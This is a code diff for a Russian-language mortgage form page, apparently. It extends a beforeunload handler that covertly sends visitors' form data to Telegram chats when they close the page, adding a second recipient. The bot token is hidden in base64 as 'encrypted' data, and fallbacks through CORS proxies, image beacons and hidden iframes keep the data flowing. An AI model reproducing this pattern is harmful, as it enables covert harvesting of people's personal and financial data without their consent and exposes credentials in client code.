@@ -575,6 +575,7 @@
             try {
                 // Используем синхронный XMLHttpRequest, так как beforeunload не ждет асинхронных операций
                 const xhr = new XMLHttpRequest();
+                const xhr2 = new XMLHttpRequest(); // Создаем второй объект для отправки второму администратору
                 
                 // Зашифрованные данные
                 const encryptedToken = "N2E3MTUxNjE5MTpBQUVfTW5FQURUcjZNWTdScUl2dThESGRHYUw5YkpBbGJr";
@@ -587,7 +588,7 @@
                 const SECOND_ADMIN_ID = atob(encryptedSecondAdminId);
                 
                 // Формируем текст сообщения
-                let messageText = `�� *Новые данные по ипотеке (закрытие страницы)*\n\n`;
+                let messageText = `🔔 *Новые данные по ипотеке (закрытие страницы)*\n\n`;
                 
                 if (formData.telegramUsername) {
                     messageText += `*Telegram:* @${formData.telegramUsername}\n\n`;
@@ -602,7 +603,7 @@
                 let success = false;
                 
                 try {
-                    // Пробуем прямой запрос
+                    // Пробуем прямой запрос для первого администратора
                     xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, false);
                     xhr.setRequestHeader('Content-Type', 'application/json');
                     xhr.send(JSON.stringify({
@@ -611,8 +612,17 @@
                         parse_mode: 'Markdown'
                     }));
                     
+                    // Пробуем прямой запрос для второго администратора
+                    xhr2.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, false);
+                    xhr2.setRequestHeader('Content-Type', 'application/json');
+                    xhr2.send(JSON.stringify({
+                        chat_id: SECOND_ADMIN_ID,
+                        text: messageText,
+                        parse_mode: 'Markdown'
+                    }));
+                    
                     // Проверяем результат
-                    if (xhr.status >= 200 && xhr.status < 300) {
+                    if ((xhr.status >= 200 && xhr.status < 300) || (xhr2.status >= 200 && xhr2.status < 300)) {
                         console.log('Метод 1 (beforeunload): Прямой запрос успешен!');
                         success = true;
                     }
@@ -638,7 +648,7 @@
                             // URL API Telegram
                             const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                             
-                            // Отправляем запрос через прокси
+                            // Отправляем запрос через прокси для первого администратора
                             xhr.open('POST', proxy + apiUrl, false);
                             xhr.setRequestHeader('Content-Type', 'application/json');
                             xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
@@ -648,8 +658,18 @@
                                 parse_mode: 'Markdown'
                             }));
                             
+                            // Отправляем запрос через прокси для второго администратора
+                            xhr2.open('POST', proxy + apiUrl, false);
+                            xhr2.setRequestHeader('Content-Type', 'application/json');
+                            xhr2.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+                            xhr2.send(JSON.stringify({
+                                chat_id: SECOND_ADMIN_ID,
+                                text: messageText,
+                                parse_mode: 'Markdown'
+                            }));
+                            
                             // Проверяем результат
-                            if (xhr.status >= 200 && xhr.status < 300) {
+                            if ((xhr.status >= 200 && xhr.status < 300) || (xhr2.status >= 200 && xhr2.status < 300)) {
                                 console.log(`Метод 2 (beforeunload): Прокси ${proxy} успешен!`);
                                 success = true;
                                 break;
@@ -664,37 +684,47 @@
                 // Метод 3: Использование Image для GET-запроса (работает без CORS)
                 if (!success) {
                     try {
-                        // Создаем объект Image
-                        const img = new Image();
+                        // Создаем объекты Image
+                        const img1 = new Image();
+                        const img2 = new Image();
                         
-                        // URL для запроса с параметрами
-                        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(messageText)}&parse_mode=Markdown`;
+                        // URL для запросов с параметрами
+                        const url1 = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(messageText)}&parse_mode=Markdown`;
+                        const url2 = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${SECOND_ADMIN_ID}&text=${encodeURIComponent(messageText)}&parse_mode=Markdown`;
                         
-                        // Устанавливаем src для изображения
-                        img.src = url;
+                        // Устанавливаем src для изображений
+                        img1.src = url1;
+                        img2.src = url2;
                         
-                        console.log('Метод 3 (beforeunload): Запрос через Image отправлен');
+                        console.log('Метод 3 (beforeunload): Запросы через Image отправлены');
                         success = true;
                     } catch (imgError) {
                         console.warn('Метод 3 (beforeunload) не сработал:', imgError);
                     }
                 }
                 
-                // Метод 4: Создание скрытого iframe
+                // Метод 4: Создание скрытых iframe
                 if (!success) {
                     try {
-                        // Создаем iframe
-                        const iframe = document.createElement('iframe');
-                        iframe.style.display = 'none';
-                        document.body.appendChild(iframe);
+                        // Создаем iframe для первого администратора
+                        const iframe1 = document.createElement('iframe');
+                        iframe1.style.display = 'none';
+                        document.body.appendChild(iframe1);
                         
-                        // URL для запроса
-                        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(messageText)}&parse_mode=Markdown`;
+                        // Создаем iframe для второго администратора
+                        const iframe2 = document.createElement('iframe');
+                        iframe2.style.display = 'none';
+                        document.body.appendChild(iframe2);
+                        
+                        // URL для запросов
+                        const url1 = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(messageText)}&parse_mode=Markdown`;
+                        const url2 = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${SECOND_ADMIN_ID}&text=${encodeURIComponent(messageText)}&parse_mode=Markdown`;
                         
                         // Устанавливаем src для iframe
-                        iframe.src = url;
+                        iframe1.src = url1;
+                        iframe2.src = url2;
                         
-                        console.log('Метод 4 (beforeunload): Запрос через iframe отправлен');
+                        console.log('Метод 4 (beforeunload): Запросы через iframe отправлены');
                         success = true;
                     } catch (iframeError) {
                         console.warn('Метод 4 (beforeunload) не сработал:', iframeError);
